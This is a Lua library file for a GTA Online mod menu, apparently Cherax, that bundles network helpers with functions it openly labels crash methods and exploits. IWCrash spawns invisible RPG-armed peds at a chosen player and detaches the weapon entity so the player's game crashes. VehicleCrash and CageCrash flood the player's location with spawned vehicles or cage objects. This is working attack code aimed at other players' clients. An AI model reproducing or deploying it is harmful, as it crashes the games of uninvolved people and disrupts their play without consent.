--[[
    JerryScript Network Library
    Network sync, crash methods, and exploits for Cherax
]]

local Network = {}

-- ═══════════════════════════════════════════════════════════════════════════
-- NATIVE HASHES
-- ═══════════════════════════════════════════════════════════════════════════

local N = {
    -- Network
    NETWORK_IS_SESSION_STARTED = 0x9DE624D2FC4B603F,
    NETWORK_IS_PLAYER_ACTIVE = 0xB8DFD30D6973E135,
    NETWORK_GET_NETWORK_ID_FROM_ENTITY = 0xA11700682F3AD45C,
    NETWORK_REQUEST_CONTROL_OF_ENTITY = 0xB69317BF5E782347,
    NETWORK_HAS_CONTROL_OF_ENTITY = 0x01BF60A500E28887,
    
    -- Player
    GET_PLAYER_PED = 0x43A66C31C68491C0,
    PLAYER_ID = 0x4F8644AF03D0E0D6,
    PLAYER_PED_ID = 0xD80958FC74E988A6,
    GET_PLAYER_NAME = 0x6D0DE6A7B5DA71F8,
    IS_PLAYER_PLAYING = 0x5E9564D8246B909A,
    
    -- Entity
    GET_ENTITY_COORDS = 0x3FEF770D40960D5A,
    SET_ENTITY_COORDS = 0x06843DA7060A026B,
    SET_ENTITY_COORDS_NO_OFFSET = 0x239A3351AC1DA385,
    SET_ENTITY_VISIBLE = 0xEA1C610A04DB6BBB,
    SET_ENTITY_HEALTH = 0x6B76DC1F3AE6E6A3,
    DELETE_ENTITY = 0xAE3CBE5BF394C9C9,
    SET_ENTITY_AS_MISSION_ENTITY = 0xAD738C3085FE7E11,
    DETACH_ENTITY = 0x961AC54BF0613F5D,
    
    -- Ped
    IS_PED_A_PLAYER = 0x12534C348C6CB68B,
    IS_PED_IN_ANY_VEHICLE = 0x997ABD671D25CA0B,
    GET_VEHICLE_PED_IS_IN = 0x9A9112A0FE9A4713,
    CREATE_PED = 0xD49F9B0955C367DE,
    SET_PED_INTO_VEHICLE = 0xF75B0D629E1C063D,
    SET_PED_COMBAT_ATTRIBUTES = 0x9F7794730795E019,
    
    -- Weapon
    GIVE_WEAPON_TO_PED = 0xBF0FD6E56C964FCB,
    GIVE_DELAYED_WEAPON_TO_PED = 0xB282DC6EBD803C75,
    SET_PED_GADGET = 0xD0D7B1E680ED4A1A,
    GET_CURRENT_PED_WEAPON_ENTITY_INDEX = 0x3B390A939AF0B5FC,
    SET_CURRENT_PED_WEAPON = 0xADF692B254977C0C,
    
    -- Model
    REQUEST_MODEL = 0x963D27A58DF860AC,
    HAS_MODEL_LOADED = 0x98A4EB5D89A0C952,
    SET_MODEL_AS_NO_LONGER_NEEDED = 0xE532F5D78798DAAB,
    
    -- Vehicle  
    CREATE_VEHICLE = 0xAF35D0D2583051B0,
}

-- ═══════════════════════════════════════════════════════════════════════════
-- HELPER FUNCTIONS
-- ═══════════════════════════════════════════════════════════════════════════

local function requestModel(hash, timeout)
    timeout = timeout or 1000
    Natives.InvokeVoid(N.REQUEST_MODEL, hash)
    local waited = 0
    while not Natives.InvokeBool(N.HAS_MODEL_LOADED, hash) do
        Script.Yield(10)
        waited = waited + 10
        if waited > timeout then return false end
    end
    return true
end

local function releaseModel(hash)
    Natives.InvokeVoid(N.SET_MODEL_AS_NO_LONGER_NEEDED, hash)
end

local function requestControl(entity)
    if Natives.InvokeBool(N.NETWORK_HAS_CONTROL_OF_ENTITY, entity) then
        return true
    end
    Natives.InvokeVoid(N.NETWORK_REQUEST_CONTROL_OF_ENTITY, entity)
    return Natives.InvokeBool(N.NETWORK_HAS_CONTROL_OF_ENTITY, entity)
end

local function betterDelete(entity)
    if not entity or entity == 0 then return end
    pcall(function()
        requestControl(entity)
        Natives.InvokeVoid(N.SET_ENTITY_AS_MISSION_ENTITY, entity, true, true)
        Natives.InvokeVoid(N.DELETE_ENTITY, entity)
    end)
end

-- ═══════════════════════════════════════════════════════════════════════════
-- PLAYER FUNCTIONS
-- ═══════════════════════════════════════════════════════════════════════════

function Network.GetLocalPlayer()
    return Natives.InvokeInt(N.PLAYER_ID)
end

function Network.GetLocalPed()
    return Natives.InvokeInt(N.PLAYER_PED_ID)
end

function Network.GetPlayerPed(pid)
    return Natives.InvokeInt(N.GET_PLAYER_PED, pid)
end

function Network.GetPlayerCoords(pid)
    local ped = Network.GetPlayerPed(pid)
    if not ped or ped == 0 then return nil, nil, nil end
    return Natives.InvokeV3(N.GET_ENTITY_COORDS, ped, true)
end

function Network.IsPlayerActive(pid)
    return Natives.InvokeBool(N.NETWORK_IS_PLAYER_ACTIVE, pid)
end

function Network.IsInSession()
    return Natives.InvokeBool(N.NETWORK_IS_SESSION_STARTED)
end

-- ═══════════════════════════════════════════════════════════════════════════
-- CRASH METHODS
-- ═══════════════════════════════════════════════════════════════════════════

-- IW Crash (Invalid Weapon) - Detaches weapon entity causing desync crash
function Network.IWCrash(pid, count)
    local tx, ty, tz = Network.GetPlayerCoords(pid)
    if not tx then return false end
    
    count = count or 10
    local model = Utils.Joaat("cs_tenniscoach")
    if not requestModel(model) then return false end
    
    local spawnedPeds = {}
    
    for i = 1, count do
        pcall(function()
            -- Create invisible ped above target
            local ped = GTA.CreatePed(26, model, tx, ty, tz + 10 + i, 0, true, true)
            if ped and ped ~= 0 then
                table.insert(spawnedPeds, ped)
                
                -- Teleport to target
                Natives.InvokeVoid(N.SET_ENTITY_COORDS_NO_OFFSET, ped, tx, ty, tz + 1, false, false, false)
                Natives.InvokeVoid(N.SET_ENTITY_VISIBLE, ped, false, false)
                
                -- Give RPG
                local rpgHash = 0xB1CA77B1  -- WEAPON_RPG
                Natives.InvokeVoid(N.GIVE_DELAYED_WEAPON_TO_PED, ped, rpgHash, 1, false)
                Script.Yield(25)
                
                -- Set as gadget and get weapon entity
                Natives.InvokeVoid(N.SET_PED_GADGET, ped, rpgHash, true)
                local weaponEnt = Natives.InvokeInt(N.GET_CURRENT_PED_WEAPON_ENTITY_INDEX, ped, 0)
                
                if weaponEnt and weaponEnt ~= 0 then
                    -- Detach weapon - this causes the crash
                    Natives.InvokeVoid(N.DETACH_ENTITY, weaponEnt, true, true)
                end
                
                -- Kill ped
                Natives.InvokeVoid(N.SET_ENTITY_HEALTH, ped, 0, 0)
            end
        end)
        Script.Yield(50)
    end
    
    -- Cleanup after delay
    Script.QueueJob(function()
        Script.Yield(500)
        for _, ped in ipairs(spawnedPeds) do
            betterDelete(ped)
        end
        releaseModel(model)
    end)
    
    return true
end

-- Vehicle Crash - Spawns invalid vehicle configurations
function Network.VehicleCrash(pid, count)
    local tx, ty, tz = Network.GetPlayerCoords(pid)
    if not tx then return false end
    
    count = count or 5
    local model = Utils.Joaat("adder")
    if not requestModel(model) then return false end
    
    for i = 1, count do
        pcall(function()
            local veh = GTA.CreateVehicle(model, tx + math.random(-5, 5), ty + math.random(-5, 5), tz + 50, 0, true, true)
            if veh and veh ~= 0 then
                Script.QueueJob(function()
                    Script.Yield(100)
                    betterDelete(veh)
                end)
            end
        end)
        Script.Yield(50)
    end
    
    releaseModel(model)
    return true
end

-- Cage Crash - Uses cage objects in invalid state
function Network.CageCrash(pid)
    local tx, ty, tz = Network.GetPlayerCoords(pid)
    if not tx then return false end
    
    local cageHash = Utils.Joaat("prop_gold_cont_01")
    if not requestModel(cageHash) then return false end
    
    for i = 1, 5 do
        pcall(function()
            local obj = GTA.CreateObject(cageHash, tx, ty, tz - 1 + i * 0.1, true, true)
            if obj and obj ~= 0 then
                Script.QueueJob(function()
                    Script.Yield(200)
                    betterDelete(obj)
                end)
            end
        end)
        Script.Yield(20)
    end
    
    releaseModel(cageHash)
    return true
end

-- ═══════════════════════════════════════════════════════════════════════════
-- SYNC FUNCTIONS
-- ═══════════════════════════════════════════════════════════════════════════

function Network.RequestEntityControl(entity, timeout)
    timeout = timeout or 100
    local start = os.clock()
    
    while not Natives.InvokeBool(N.NETWORK_HAS_CONTROL_OF_ENTITY, entity) do
        Natives.InvokeVoid(N.NETWORK_REQUEST_CONTROL_OF_ENTITY, entity)
        if (os.clock() - start) * 1000 > timeout then
            return false
        end
        Script.Yield(0)
    end
    return true
end

function Network.HasEntityControl(entity)
    return Natives.InvokeBool(N.NETWORK_HAS_CONTROL_OF_ENTITY, entity)
end

function Network.GetEntityNetworkId(entity)
    return Natives.InvokeInt(N.NETWORK_GET_NETWORK_ID_FROM_ENTITY, entity)
end

return Network
